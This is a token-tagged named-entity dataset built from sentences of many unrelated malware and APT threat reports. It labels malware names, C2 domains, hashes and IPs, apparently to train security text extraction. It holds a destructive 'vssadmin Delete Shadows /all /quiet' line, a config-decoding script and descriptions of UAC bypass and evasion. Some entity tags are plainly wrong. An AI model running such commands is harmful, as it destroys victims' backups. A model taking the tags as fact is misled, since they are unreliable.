the	O
materials	O
,	O
which	O
you	O
can	O
find	O
in	O
the	O
attachment	O
.	O

Very	O
little	O
active	O
hacking	O
activity	O
was	O
detected	O
during	O
weekends	O
.	O

The	O
Shellcode	O
for	O
communication	O
is	O
conducted	O
depending	O
on	O
Beacon	O
mode	O
which	O
is	O
generated	O
on	O
the	O
basis	O
of	O
automatic	O
attack	O
detection	O
platform-Cobalt	O
Strike	O
.	O

Example	O
of	O
a	O
TG-4127	B-malware.infosteal
fake	O
Google	O
Account	O
login	O
page	O
.	O

In	O
at	O
least	O
one	O
case	O
,	O
the	O
victim	O
's	O
computer	O
was	O
attacked	O
only	O
twice	O
in	O
the	O
last	O
two	O
years	O
,	O
with	O
only	O
two	O
malicious	O
programs	O
–	O
RedOctober	B-malware.unknown
and	O
Cloud	B-malware.unknown
Atlas	I-malware.unknown
.	O

Realtek	O
,	O
25.01.2010	O
Realtek	O
,	O
25.01.2010	O
Jmicron	O
,	O
unknown	O

Scrambled	O
AES256	O
key	O
(	O
0xC1	O
XOR	O
0x13	O
=	O
0xD2	O
,	O
0xD2	O
ROL	O
6	O
=	O
0xB4	O
)	O
etc	O
.	O
)	O

We	O
analyzed	O
the	O
attachments	O
and	O
discovered	O
that	O
they	O
contained	O
the	O
FinSpy	B-malware.infosteal
spyware	I-malware.infosteal
,	O
FinFisher	B-malware.backdoor
's	O
remote	O
monitoring	O
product	O
.	O

(	O
2013	O
)	O
.	O

It	O
is	O
one	O
specific	O
feature	O
of	O
Retro	B-malware.backdoor
Trojan	B-malware.backdoor
family	O
.	O

Be	O
aware	O
that	O
some	O
services	O
(	O
e.g.	O
,	O
FTP	O
,	O
telnet	O
,	O
and	O
.rlogin	O
)	O
transmit	O
user	O
credentials	O
in	O
clear	O
text	O
.	O

(	O
config_size	O
,	O
)	O
=	O
struct.unpack	O
(	O
'	O
=I	O
'	O
,	O
data	O
[	O
offset	O
:	O
offset+4	O
]	O
)	O
config_offset	O
=	O
offset	O
+	O
4	O
encode_config	O
=	O
data	O
[	O
config_offset	O
:	O
config_offset+config_size	O
]	O
i	O
=	O
0	O
seed	O
=	O
config_size	O
*	O
2	O
//	O
It	O
does	O
not	O
necessarily	O
double	O
while	O
i	O
<	O
config_size	O
:	O
(	O
result	O
,	O
seed	O
)	O
=	O
rand_with_seed	O
(	O
seed	O
)	O
result	O
&	O
=	O
0xff	O
decode_data.append	O
(	O
chr	O
(	O
ord	O
(	O
encode_config	O
[	O
i	O
]	O
)	O
^	O
result	O
)	O
)	O
i	O
+=	O
1	O
decode_config	O
=	O
'	O
'	O
.join	O
(	O
decode_data	O
)	O
(	O
decode_size	O
,	O
)	O
=	O
struct.unpack	O
(	O
'	O
=I	O
'	O
,	O
decode_config	O
[	O
config_size-4	O
:	O
config_size	O
]	O
)	O
config	O
=	O
lznt1_decompress	O
(	O
decode_config	O
,	O
config_size	O
,	O
decode_size	O
)	O

takeScreenShot	O

Win32/Salgorea.BD	O
Win32/Korplug.MK	O

allow	O
threat	O
actors	O
to	O
insert	O
and	O
execute	O
unauthorized	O
code	O
in	O
web	O
applications	O
.	O

Appendix	O
B	O
:	O
ClamAV	O
signatures	O
12	O
.	O

The	O
reproduction	O
and	O
distribution	O
of	O
this	O
material	O
is	O
forbidden	O
without	O
express	O
written	O
permission	O
from	O
iDefense	O
.	O

The	O
Cybereason	O
platform	O
is	O
powered	O
by	O
a	O
custom-built	O
in-memory	O
graph	O
,	O
the	O
only	O
truly	O
automated	O
hunting	O
engine	O
anywhere	O
.	O

WHOIS	B-url.normal
Panamaserver.com	O

However	O
,	O
when	O
a	O
major	O
cyber-espionage	O
operation	O
is	O
exposed	O
,	O
the	O
attackers	O
are	O
unlikely	O
to	O
completely	O
shut	O
down	O
everything	O
.	O

Beware	O
though	O
,	O
just	O
because	O
these	O
attacks	O
are	O
conceptually	O
targeted	O
,	O
it	O
does	O
n't	O
necessarily	O
mean	O
that	O
they	O
should	O
have	O
a	O
higher	O
priority	O
than	O
any	O
other	O
threat	O
on	O
your	O
security	O
program	O
.	O

World	O
Anti-Doping	O
Agency	O
.	O

Even	O
if	O
cyber	O
security	O
measures	O
fail	O
,	O
safety	O
controls	O
are	O
designed	O
to	O
prevent	O
physical	O
damage	O
.	O

For	O
instance	O
,	O
such	O
defense	O
technologies	O
trigger	O
if	O
a	O
potentially	O
vulnerable	O
application	O
such	O
as	O
Adobe	O
Flash	O
starts	O
other	O
untrusted	O
applications	O
,	O
scripts	O
interpreters	O
or	O
even	O
the	O
command	O
console	O
.	O

Malware	O
then	O
reads	O
the	O
c2	O
response	O
and	O
from	O
the	O
C2	O
response	O
it	O
extracts	O
two	O
things	O
a	O
)	O
URL	O
to	O
download	O
the	O
updated	O
executable	O
and	O
b	O
)	O
the	O
command	O
string	O
that	O
will	O
trigger	O
the	O
update	O
functionality	O

The	O
injection	O
library	O
can	O
ask	O
for	O
additional	O
permissions	O
,	O
execute	O
code	O
and	O
steal	O
information	O
from	O
the	O
original	O
application	O
,	O
among	O
other	O
things	O
.	O

Starts	O
in	O
Function	O
:	O
cef_string_utf8_to_utf16	O

The	O
malware	O
author	O
will	O
add	O
code	O
to	O
delay	O
the	O
execution	O
of	O
the	O
important	O
functionality	O
for	O
some	O
period	O
of	O
time	O
with	O
the	O
idea	O
being	O
that	O
if	O
the	O
malware	O
stalls	O
for	O
long	O
enough	O
,	O
the	O
dynamic	O
malware	O
analysis	O
system	O
will	O
give	O
up	O
on	O
it	O
and	O
pass	O
it	O
off	O
as	O
benign	O
.	O

The	O
APT	O
actors	O
,	O
hardcoded	O
additional	O
backup	O
C	O
&	O
C	O
website	O
(	O
lindamullins[.]info	B-url.cncsvr
)	O
that	O
is	O
contacted	O
in	O
case	O
the	O
malware	O
does	O
not	O
get	O
a	O
response	O
from	O
the	O
first	O
website	O
.	O

A	O
more	O
detailed	O
explanation	O
concerning	O
the	O
MSNP21	O
can	O
be	O
found	O
at.MSNP21	O
is	O
the	O
MSN	O
messenger	O
chat	O
protocol	O
that	O
was	O
introduced	O
with	O
Windows	O
Live	O
2010	O
beta	O
.	O

Posted	O
August	O
2	O
,	O
2013	O
by	O
TCIRT	O
&	O
filed	O
under	O
Research	O
.	O

The	O
payload	O
,	O
if	O
exists	O
,	O
is	O
supposed	O
to	O
be	O
an	O
executable	O
file	O
and	O
may	O
be	O
executed	O
if	O
there	O
is	O
a	O
corresponding	O
command	O
present	O
in	O
the	O
INI	O
part	O
.	O

Previous	O
reporting	O
,	O
ref	O
:	O
Fidelis	O
Threat	O
Advisory	O
(	O
FTA	O
)	O
#	O
1011	O
dated	O
15	O
Jan	O
2014	O
,	O
introduced	O
a	O
malware	O
system	O
comprised	O
of	O
multiple	O
files	O
that	O
reflected	O
a	O
means	O
for	O
intruders	O
to	O
discover	O
and	O
retrieve	O
data	O
from	O
disparate	O
computer	O
systems	O
via	O
removable	O
storage	O
devices	O
.	O

Once	O
the	O
file	O
has	O
been	O
successfully	O
saved	O
,	O
the	O
pdf	O
is	O
opened	O
and	O
displayed	O
to	O
the	O
user	O
via	O
ShellExecute	O
API	O
and	O
Open	O
command	O
.	O

As	O
new	O
methodologies	O
become	O
more	O
broadly	O
detected	O
,	O
threat	O
actors	O
will	O
continue	O
to	O
embrace	O
alternate	O
and	O
new	O
strategies	O
to	O
continue	O
achieving	O
their	O
objectives	O
.	O

Figure	O
14	O
:	O
Infection	O
Chain	O
of	O
Campaign	O
#	O
1	O

It	O
is	O
possible	O
to	O
scrub	O
these	O
details	O
,	O
but	O
our	O
attackers	O
seem	O
to	O
have	O
forgotten	O
this	O
–	O
or	O
inserted	O
faked	O
data	O
.	O

HKLM\Software\Microsoft\Windows\CurrentVersion\Run	O
;	O
•	O
Excessive	O
use	O
of	O
known	O
administrative	O
privilege	O
accounts	O
should	O
be	O
alerted	O
on	O
–	O
specifically	O
in	O
a	O
'	O
one	O
to	O
many	O
'	O
behavioural	O
configuration	O
.	O

There	O
is	O
a	O
chance	O
for	O
the	O
mistaken	O
code	O
to	O
still	O
work	O
--	O
user	O
information	O
could	O
be	O
copied	O
into	O
the	O
send	O
information	O
heap	O
.	O

We	O
sinkholed	O
uranio2.no-ip.biz	B-malware.unknown
between	O
November	O
22	O
,	O
2013	O
and	O
January	O
6	O
,	O
2014	O
.	O

The	O
device	O
driver	O
does	O
not	O
capture	O
or	O
store	O
any	O
network	O
traffic	O
outside	O
of	O
the	O
initial	O
handshake	O
inspection	O
.	O

The	O
majority	O
of	O
the	O
observed	O
victims	O
were	O
not	O
using	O
enterprise	O
versions	O
of	O
Microsoft	O
software	O
.	O

Live	O
Webcam	O
For	O
Free	O

The	O
shellcode	O
copies	O
this	O
encrypted	O
binary	O
to	O
the	O
user	O
's	O
AppData	O
directory	O
as	O
'	O
a.exe	O
'	O
.	O

mshta.exe	O
process	O
and	O
goes	O
through	O
open	O
file	O
handles	O
to	O
find	O
a	O
handle	O
for	O
the	O
temporary	O
file	O
that	O
is	O
associated	O
with	O
the	O
downloaded	O
contents	O
.	O

The	O
actor	O
@	O
anpoland	O
,	O
purporting	O
to	O
represent	O
'	O
Anonymous	O
Poland	O
,	O
'	O
claims	O
to	O
have	O
defaced	O
the	O
WADA	O
website	O
.	O

The	O
purpose	O
of	O
the	O
'	O
d13	O
'	O
directory	O
remains	O
unknown	O
,	O
although	O
it	O
is	O
assumed	O
to	O
serve	O
for	O
requests	O
of	O
a	O
third	O
currently	O
unknown	O
family	O
.	O

Last	O
year	O
on	O
26	O
of	O
September	O
,	O
PaloAlto	O
identified	O
a	O
new	O
Mac	O
OS	O
X	O
Trojan	B-malware.backdoor
associated	O
with	O
the	O
APT28/Sofacy	O
group	O
that	O
received	O
the	O
'	O
Komplex	B-malware.backdoor
'	O
name	O
.	O

Although	O
all	O
known	O
variations	O
of	O
Duqu	B-malware.infosteal
are	O
from	O
the	O
period	O
November	O
2010-October	O
2011	O
,	O
we	O
believe	O
there	O
were	O
earlier	O
versions	O
of	O
the	O
Trojan	O
spy	O
created	O
to	O
steal	O
information	O
.	O

McAfee	O
Firewall	O
Enterprise.TrustedSource	O
has	O
coverage	O
for	O
domains	O
and	O
IP	O
addresses	O
that	O
the	O
malware	O
contacts	O
.	O

The	O
command	O
index	O
calculator	O
and	O
jump	O
to	O
the	O
appropriate	O
command	O
.	O

Follow	O
us	O
on	O
Twitter	O
Based	O
on	O
our	O
analysis	O
,	O
financial	O
organizations	O
in	O
Turkey	O
were	O
targeted	O
via	O
spear	O
phishing	O
emails	O
containing	O
a	O
malicious	O
Microsoft	O
Word	O
document	O
.	O

They	O
seem	O
to	O
prefer	O
ChangeIP	O
(	O
https://www.changeip.com/services/free-dynamic-dns/	B-url.unknown
(	I-url.unknown
https://www.changeip.com/services/free-dynamic-dns/	I-url.unknown
)	O
)	O
and	O
Afraid	O
(	O
https://freedns.afraid.org/	O
(	O
https://freedns.afraid.org/	B-url.unknown
)	O
)	O
for	O
free	O
DNS	O
services	O
,	O
although	O
they	O
previously	O
heavily	O
used	O
Sitelutions	O
(	O
https://sitelutions.com/info/sldns(	B-url.unknown
https://sitelutions.com/info/sldns)	I-url.unknown
)	O
.	O

For	O
example	O
,	O
adding	O
or	O
removing	O
additional	O
security	O
products	O
based	O
on	O
the	O
predominant	O
software	O
providers	O
in	O
their	O
target	O
region	O
.	O

Palestinian	O
Territory	O
,	O
Occupied	O
Gaza	O
Palestine	O
Telecommunications	O
Company	O
(	O
paltel	O
)	O
,	O
ASN	O
:	O
AS12975	O

Because	O
of	O
this	O
,	O
the	O
key	O
that	O
is	O
ultimately	O
used	O
is	O
The	O
configuration	O
data	O
includes	O
:	O
Name	O
of	O
the	O
installed	O
backdoor	O
file	O
Directory	O
under	O
which	O
the	O
backdoor	O
file	O
is	O
installed	O
Which	O
process	O
it	O
will	O
inject	O
into	O
(	O
if	O
specified	O
)	O
CnC	O
information	O
FTP	O
information	O
for	O
sending	O
stolen	O
keystroke	O
data	O
to	O
Mutex	O
name	O
of	O
the	O
master	O
process	O
,	O
ID	O
and	O
group	O
name	O
which	O
are	O
used	O
by	O
the	O
actors	O
for	O
organizational	O
purposes	O
Because	O
the	O
decrypted	O
configuration	O
data	O
can	O
be	O
reliably	O
located	O
in	O
memory	O
(	O
with	O
only	O
slight	O
variations	O
in	O
its	O
structure	O
from	O
version	O
to	O
version	O
)	O
and	O
because	O
not	O
all	O
versions	O
of	O
XtremeRAT	B-malware.backdoor
will	O
write	O
their	O
configuration	O
data	O
to	O
disk	O
,	O
parsing	O
memory	O
dumps	O
of	O
infected	O
systems	O
is	O
often	O
the	O
ideal	O
method	O
for	O
extracting	O
intelligence	O
.	O

kindly	O
find	O
attached	O
our	O
bank	O
online	O
java	O
documents	O
for	O
your	O
reference	O
,	O
corr=ct	O
details	O
on	O
the	O
marked	O
boxes	O
and	O
email	O
back	O
to	O
me	O
.	O

For	O
example	O
,	O
when	O
the	O
C2	O
sends	O
a	O
DNS	O
response	O
with	O
the	O
IP	O
address	O
134.170.185.13	B-ip.unknown
,	O
the	O
RAT	O
will	O
try	O
and	O
steal	O
outlook	O
passwords	O
.	O

If	O
the	O
driver	O
does	O
not	O
detect	O
the	O
appropriate	O
handshake	O
,	O
then	O
the	O
network	O
traffic	O
is	O
allowed	O
to	O
pass	O
unobstructed	O
.	O

Statically	O
,	O
the	O
best	O
one	O
can	O
do	O
is	O
detect	O
the	O
presence	O
of	O
remotely	O
included	O
Flash	B-malware.backdoor
content	I-malware.backdoor
.	O

It	O
then	O
adds	O
a	O
registry	O
entry	O
for	O
the	O
dropped	O
executable	O
and	O
invokes	O
eventvwr.exe	O
,	O
this	O
is	O
an	O
interesting	O
registry	O
hijack	O
technique	O
which	O
allows	O
the	O
doc6.exe	O
to	O
be	O
executed	O
by	O
eventvwr.exe	O
with	O
high	O
integrity	O
level	O
and	O
also	O
this	O
technique	O
silently	O
bypasses	O
the	O
UAC	O
(	O
user	O
account	O
control	O
)	O
.	O

Malware	O
checks	O
if	O
the	O
executable	O
is	O
running	O
as	O
SQLite.exe	O
from	O
%	O
AppData	O
%	O
\SQLite	O
directory	O
,	O
if	O
not	O
it	O
copies	O
itself	O

The	O
main	O
component	O
of	O
CozyDuke	B-malware.drop
is	O
a	O
DLL	O
file	O
responsible	O
for	O
orchestrating	O
all	O
of	O
CozyDuke	B-malware.drop
's	O
activity	O
on	O
a	O
victim	O
machine	O
.	O

Attempting	O
to	O
directly	O
access	O
the	O
URL	O
leads	O
to	O
an	O
'	O
HTTP/1.1	O
404	O
Not	O
Found	O
'	O
message	O
.	O

The	O
domain	O
win7-updates[.]com	B-url.cncsvr
is	O
being	O
used	O
by	O
the	O
group	O
as	O
a	O
command	O
and	O
control	O
address	O
.	O

For	O
picking	O
a	O
process	O
to	O
infect	O
the	O
malware	O
randomly	O
picks	O
one	O
from	O
a	O
list	O
of	O
prospects	O
.	O

JRat	B-malware.backdoor
is	O
currently	O
available	O
for	O
purchase	O
at	O
jrat[.]io	B-url.normal
for	O
the	O
price	O
of	O
$	O
40	O
USD	O
.	O

Upon	O
agreeing	O
to	O
the	O
EULA	O
,	O
an	O
operational	O
copy	O
of	O
Freegate	B-malware.infosteal
proxy	O
is	O
launched	O
,	O
which	O
includes	O
a	O
request	O
to	O
unblock	O
the	O
firewall	O
.	O

Reduce	O
privileges	O
to	O
only	O
those	O
needed	O
for	O
a	O
user	O
's	O
duties	O
.	O

This	O
sample	O
seems	O
to	O
have	O
been	O
continuously	O
developed	O
and	O
improved	O
over	O
the	O
course	O
of	O
the	O
last	O
couple	O
of	O
years	O
.	O

As	O
an	O
anti-analysis	O
trick	O
this	O
is	O
considerably	O
useless	O
,	O
it	O
does	O
make	O
sense	O
though	O
to	O
trick	O
malware	O
detection	O
solutions	O
which	O
apply	O
heuristics	O
based	O
on	O
static	O
analysis	O
of	O
API	O
calls	O
.	O

Figure	O
1	O
:	O
Walkthrough	O
of	O
exploitation	O
process	O
The	O
attack	O
loads	O
Adobe	B-malware.drop
Flash	I-malware.drop
Player	O
from	O
within	O
Microsoft	O
Office	O
,	O
which	O
is	O
a	O
popular	O
approach	O
to	O
Flash	O
exploitation	O
since	O
Flash	O
is	O
disabled	O
in	O
many	O
browsers	O
.	O

RECV	O
:	O
85190000250400000000404000000000	O
SEND	O
:	O
86190000040100006666464000000000	O
RECV	O
:	O
4edf9340780100000000000000000000	O
SEND	O
:	O
00000000000000000000000000000000	O

3	O
Jan	O
.	O

The	O

For	O
example	O
,	O
the	O
executable	O
reg.exe	O
(	O
05dc62dcd4ddc9f2a79c5d23647c25c2	B-hash
)	O
creates	O
the	O
key	O
:	O

All	O
fi	O
ve	O
payloads	O
are	O
versions	O
of	O
the	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
tool	O
.	O

Ensure	O
that	O
users	O
are	O
not	O
re-using	O
passwords	O
between	O
zones	O
by	O
setting	O
policies	O
and	O
conducting	O
regular	O
audits	O
.	O

tasklist	O
-v	O
–	O
list	O
of	O
apps	O
and	O
services	O
with	O
their	O
Process	O
ID	O
(	O
PID	O
)	O
for	O
all	O
task	O
running	O

vssadmin	O
Delete	O
Shadows	O
/all	O
/quiet	O

Argentina	O
was	O
a	O
distant	O
second	O
with	O
1.22	O
percent	O
,	O
followed	O
by	O
Venezuela	O
with	O
1.02	O
percent	O
,	O
Egypt	O
with	O
0.95	O
percent	O
and	O
the	O
U.S.	O
with	O
0.9	O
percent	O
.	O

Not	O
only	O
does	O
the	O
original	O
spying	O
program	O
have	O
marks	O
of	O
wellknown	O
malware	O
that	O
can	O
be	O
detected	O
by	O
anti-malware	O
products	O
;	O
moreover	O
the	O
attackers	O
are	O
revealing	O
their	O
secret	O
activities	O
to	O
cyber-criminal	O
gangs	O
.	O

c.	O
Harddisk	O
wiper	O
:	O
Symantec	O
identified	O
Trojan.Jokra	B-malware.unknown
as	O
the	O
malware	O
component	O
that	O
wiped	O
harddisks	O
in	O
the	O
attack	O
.	O

We	O
have	O
also	O
found	O
samples	O
that	O
use	O
Microsoft	O
Word	O
files	O
embeded	O
with	O
a	O
malicious	O
macro	O
,	O
which	O
would	O
infect	O
the	O
victim	O
if	O
enabled	O
.	O

HKLM\SYSTEM\CurrentControlSet\Control\zxplug	O
is	O
opened	O
and	O
each	O
value	O
is	O
queried	O
.	O

The	O
result	O
is	O
used	O
as	O
a	O
mutex	O
name	O
.	O

Version	O
Mutex	O

Most	O
recently	O
,	O
work	O
by	O
Bahrain	O
Watch	O
has	O
confirmed	O
the	O
presence	O
of	O
a	O
Bahraini	O
FinFisher	B-malware.backdoor
campaign	O
,	O
and	O
further	O
contradicted	O
Gamma	O
's	O
public	O
statements	O
.	O

The	O
resulting	O
clear-text	O
buffer	O
contains	O
several	O
fi	O
elds	O
in	O
both	O
ASCII	O
and	O
UNICODE	O
,	O
including	O
the	O
C	O
&	O
C	O
server	O
address	O
.	O

The	O
backdoor	O
part	O
has	O
the	O
following	O
execution	O
flow	O
:	O

The	O
standard	O
network	O
protocol	O
for	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
3.6	O
employs	O
zlib	O
compression	O
,	O
which	O
utilizes	O
'	O
Gh0st	B-malware.backdoor
'	O
as	O
a	O
static	O
five-byte	O
packet	O
flag	O
that	O
must	O
be	O
included	O
in	O
the	O
first	O
five	O
bytes	O
of	O
initial	O
transmission	O
from	O
the	O
victim	O
(	O
as	O
seen	O
in	O
Figure	O
1	O
)	O
.	O

b5f4a9aac67b53762ed98fafd067c803	B-hash

Their	O
functionality	O
,	O
however	O
,	O
is	O
absolutely	O
identical	O
.	O

2017년	O
3월	O
,	O
국내에서	O
ATM	O
기기가	O
해킹되어	O
신용카드	O
정보가	O
유출된	O
사건이	O
알려진다	O
.	O

Subsequent	O
acquired	O
writes	O
into	O
the	O
new	O
thread	O
,	O
and	O
execute	O
the	O
acquired	O
shellcode	O
payload	O
.	O

Design-wise	O
,	O
this	O
sample	O
is	O
a	O
bit	O
of	O
an	O
outlier	O
.	O

NTRODUCTION	O

Specifically	O
,	O
the	O
following	O
facts	O
support	O
this	O
assessment	O
:	O
The	O
attacker	O
targeted	O
the	O
SIS	O
suggesting	O
an	O
interest	O
in	O
causing	O
a	O
high-impact	O
attack	O
with	O
physical	O
consequences	O
.	O

As	O
such	O
,	O
the	O
official	O
version	O
of	O
this	O
RAT	O
and	O
its	O
many	O
variants	O
are	O
used	O
by	O
a	O
wide	O
variety	O
of	O
actors	O
.	O

IRONGATE	B-malware.backdoor
's	O
second	O
notable	O
feature	O
involves	O
sandbox	O
evasion	O
.	O

Once	O
the	O
patching	O
was	O
applied	O
we	O
was	O
able	O
to	O
analyze	O
the	O
complete	O
malicious	O
behavior	O
of	O
the	O
malware	O
.	O

At	O
startup	O
,	O
Svchost.exe	O
checks	O
the	O
services	O
part	O
of	O
the	O
registry	O
and	O
constructs	O
a	O
list	O
of	O
services	O
to	O
load	O
.	O

This	O
file	O
was	O
retrieved	O
from	O
the	O
threat	O
intelligence	O
platforms	O
and	O
was	O
flagged	O
as	O
an	O
APT28	O
sample	O
,	O
such	O
as	O
also	O
the	O
previous	O
files	O
.	O

It	O
follows	O
the	O
general	O
structure	O
that	O
is	O
quite	O
common	O
among	O
bot	O
families	O
that	O
encrypt	O
their	O
comms	O
;	O
namely	O
,	O
a	O
pre-processing	O
operation	O
applied	O
to	O
a	O
buffer	O
,	O
followed	O
by	O
the	O
actual	O
decryption	O
step	O
.	O

Reflective	O
DLL	O
Injection	O
loads	O
malicious	O
code	O
without	O
calling	O
the	O
normal	O
Windows	O
API	O
calls	O
,	O
thereby	O
bypassing	O
security	O
verification	O
of	O
the	O
code	O
before	O
its	O
gets	O
loaded	O
into	O
memory	O
.	O

The	O
data	O
is	O
stored	O
locally	O
in	O
a	O
hidden	O
directory	O
,	O
and	O
is	O
disguised	O
with	O
encryption	O
prior	O
to	O
exfiltration	O
.	O

Further	O
,	O
it	O
did	O
not	O
provide	O
contact	O
information	O
for	O
communicating	O
with	O
the	O
attacker	O
;	O
it	O
just	O
displayed	O
an	O
image	O
from	O
the	O
Mr	O
.	O

Cluster	O

Review	O
endpoints	O
for	O
the	O
included	O
host	O
based	O
indicators	O
of	O
compromise	O
.	O

When	O
all	O
the	O
above	O
mentioned	O
conditions	O
are	O
satisfied	O
the	O
malware	O
downloads	O
the	O
executable	O
from	O
the	O
URL	O
extracted	O
from	O
the	O
C2	O
response	O
.	O

http://pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html	B-url.normal
https://www.alienvault.com/open-threat-exchange/blog/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks	B-url.normal

Numerous	O
atomic	O
indicators	O
(	O
Figure	O
11	O
)	O
were	O
identified	O
through	O
the	O
attack	O
chain	O
of	O
this	O
activity	O
and	O
might	O
serve	O
as	O
an	O
initial	O
method	O
of	O
detection	O
.	O

As	O
the	O
attacks	O
are	O
highly	O
targeted	O
,	O
the	O
total	O
number	O
of	O
victims	O
is	O
low	O
in	O
absolute	O
numbers	O
.	O

The	O
getCommand	O
method	O

Upload	O
File	O
to	O
Victim	O
System	O
Download	O
File	O
From	O
Victim	O
System	O
Get	O
System	O
Information	O
Uninstall	O
Malware	O
The	O
Uninstall	O
command	O
was	O
the	O
most	O
interesting	O
,	O
suggesting	O
that	O
the	O
actor	O
controlling	O
this	O
malware	O
would	O
like	O
to	O
keep	O
a	O
limited	O
number	O
of	O
victims	O
by	O
removing	O
this	O
tool	O
when	O
commanded	O
.	O

The	O
file	O
css.jpg	O
is	O
of	O
course	O
not	O
a	O
JPEG	O
file	O
,	O
it	O
is	O
an	O
executable	O
that	O
has	O
been	O
encoded	O
with	O
the	O
single-byte	O
XOR	O
key	O
0xFF	O
.	O

In	O
this	O
SFX	O
,	O
Windows	O
batch	O
files	O
had	O
replaced	O
the	O
ExtractPDF.exe	B-malware.backdoor
and	O
Start.exe	B-malware.backdoor
with	O
a	O
decoy	O
Flash	O
video	O
(	O
FLV	O
)	O
file	O
was	O
used	O
in	O
place	O
of	O
the	O
decoy	O
PDF	O
.	O

An	O
MDM	B-malware.infosteal
is	O
designed	O
to	O
deploy	O
applications	O
on	O
enrolled	O
devices	O
.	O

hxxp://brou.com[.]uy	B-url.unknown

Rev	O
.	O

PCC_BASEMOD	O
:	O
:ProcessPacket	O
function	O
)	O
.	O

Since	O
this	O
tool	O
depends	O
on	O
a	O
legitimate	O
DLL	O
named	O
cryptui.dll	O
,	O
the	O
search	O
order	O
path	O
will	O
find	O
the	O
malicious	O
Trojan	O
with	O
the	O
same	O
name	O
in	O
the	O
same	O
directory	O
and	O
load	O
it	O
into	O
its	O
process	O
space	O
.	O

TsLow	B-malware.unknown
also	O
exposes	O
the	O
connect	O
method	O
used	O
to	O
check	O
connectivity	O
to	O
the	O
target	O
controller	O
.	O

The	O
module	O
delays	O
execution	O
for	O
random	O
periods	O
while	O
it	O
discovers	O
running	O
processes	O
with	O
one	O
of	O
the	O
following	O
filenames	O
:	O
•	O
tcpdump.exe	O
•	O
windump.exe	O
•	O
ethereal.exe	O
•	O
wireshark.exe	O
•	O
ettercap.exe	O
•	O
snoop.exe	O
•	O
dsniff.exe	O
The	O
following	O
system	O
information	O
is	O
collected	O
:	O
1	O
.	O

Record	O
#	O
2	O
Length	O
:	O
90	O
bytes	O
:	O

The	O
campaign	O
to	O
target	O
Pyeongchang	O
Olympics	O
began	O
December	O
22	O
,	O
2017	O
with	O
the	O
most	O
recent	O
activity	O
appearing	O
December	O
28	O
.	O

Extract	O
malicious	O
chrome	O
extension	O
to	O
%	O
localappdata	O
%	O
\Temp\chrome	O
&	O
create	O
a	O
scheduled	O
task	O
to	O
execute	O
%	O
localappdata%\Temp\chrome\sec.vbs	O
.	O

(	O
2013	O
)	O
.	O

Recently	O
the	O
growth	O
of	O
amount	O
and	O
scale	O
of	O
targeted	O
attacks	O
has	O
come	O
to	O
the	O
point	O
were	O
they	O
are	O
starting	O
to	O
look	O
more	O
like	O
opportunistic	O
carpet	O
bombings	O
rather	O
than	O
ninja	O
strikes	O
.	O

Drop	O
&	O
Install	O
malicious	O
chrome	O
extension	O

If	O
the	O
value	O
does	O
not	O
equal	O
320	O
the	O
IsValidUser	O
(	O
)	O
method	O
iterates	O
over	O
the	O
Request.UserLanguages	O
collection	O
searching	O
for	O
a	O
language	O
named	O
es-DN	O
,	O
and	O
if	O
found	O
,	O
the	O
IsValidUser	O
(	O
)	O
method	O
will	O
return	O
true	O
.	O

3.5.1	O
THE	O
KEYLOGGER	O
MODULE	O

PCC_PROXY	O
:	O
:fNetworkEnabled	O
)	O
to	O
determine	O
if	O
the	O
network	O
tunneling	O
is	O
currently	O
active	O
.	O

lottery	O
mac	O
mail	O
mails	O

The	O
analysis	O
has	O
been	O
done	O
using	O
a	O
mixed-approach	O
of	O
dynamic	O
analysis	O
and	O
static	O
analysis	O
in	O
order	O
to	O
overcome	O
some	O
of	O
the	O
obfuscation	O
and	O
encryptions	O
used	O
by	O
the	O
malware	O
.	O

It	O
provides	O
a	O
complex	O
data	O
structure	O
to	O
store	O
files	O
in	O
memory	O
,	O
each	O
of	O
them	O
bearing	O
a	O
name	O
corresponding	O
to	O
filenames	O
used	O
by	O
usual	O
file	O
systems	O
.	O

In	O
the	O
case	O
of	O
an	O
even	O
value	O
,	O
the	O
randomly	O
generated	O
byte	O
is	O
added	O
first	O
,	O
followed	O
by	O
the	O
byte	O
being	O
added	O
.	O

This	O
is	O
probably	O
meant	O
to	O
limit	O
the	O
exposure	O
of	O
the	O
core	O
modules	O
to	O
analysts	O
,	O
and	O
to	O
vet	O
the	O
infection	O
before	O
performing	O
a	O
full	O
deployment	O
.	O

The	O
attackers	O
did	O
n't	O
even	O
bother	O
hiding	O
their	O
activity	O
and	O
saved	O
items	O
to	O
the	O
desktop	O
,	O
often	O
without	O
renaming	O
them	O
.	O

During	O
analysis	O
we	O
noticed	O
that	O
within	O
the	O
decrypted	O
SSL/TLS	O
communication	O
the	O
commands	O
to/from	O
the	O
C2	O
are	O
encoded	O
with	O
a	O
single-byte	O
XOR	O
.	O

The	O
threat	O
actors	O
may	O
be	O
able	O
to	O
keep	O
this	O
session	O
alive	O
and	O
maintain	O
persistent	O
access	O
.	O

We	O
also	O
found	O
this	O
cached	O
chat	O
in	O
Tor	O
based	O
chat	O
service	O
in	O
which	O
moayy2ad	O
is	O
talking	O
about	O
'	O
israil	B-malware.unknown
bnk	I-malware.unknown
acounts	O
'	O
(	O
we	O
do	O
not	O
have	O
the	O
rest	O
of	O
the	O
conversation	O
)	O
.	O

In	O
the	O
following	O
snipped	O
you	O
see	O
the	O
SQL	O
statement	O
to	O
extract	O
the	O
data	O
:	O
Just	O
in	O
the	O
same	O
way	O
,	O
the	O
backdoor	O
attempts	O
to	O
collect	O
password	O
autocomplete	O
from	O
Internet	O
Explorer	O
:	O
The	O
backdoor	O
also	O
creates	O
a	O
separate	O
thread	O
that	O
installs	O
a	O
Windows	O
hook	O
procedure	O
on	O
message	O
WH_KEYBOARD_LL	O
,	O
through	O
which	O
it	O
can	O
intercept	O
keystrokes	O
.	O

While	O
this	O
incident	O
is	O
not	O
likely	O
to	O
be	O
related	O
to	O
the	O
development	O
of	O
the	O
X-Agent	B-malware.infosteal
Android	O
variant	O
,	O
it	O
demonstrates	O
the	O
reconnaissance	O
and	O
preplanning	O
tactics	O
that	O
precede	O
the	O
rest	O
of	O
a	O
campaign	O
.	O

At	O
location	O
3.	O
,	O
the	O
recovered	O
toolmark	O
(	O
s	O
)	O
were	O
researched	O
against	O
published	O
source	O
code	O
artifacts	O
on	O
the	O
Internet	O
.	O

The	O
malware	O
is	O
able	O
to	O
browse	O
the	O
files	O
and	O
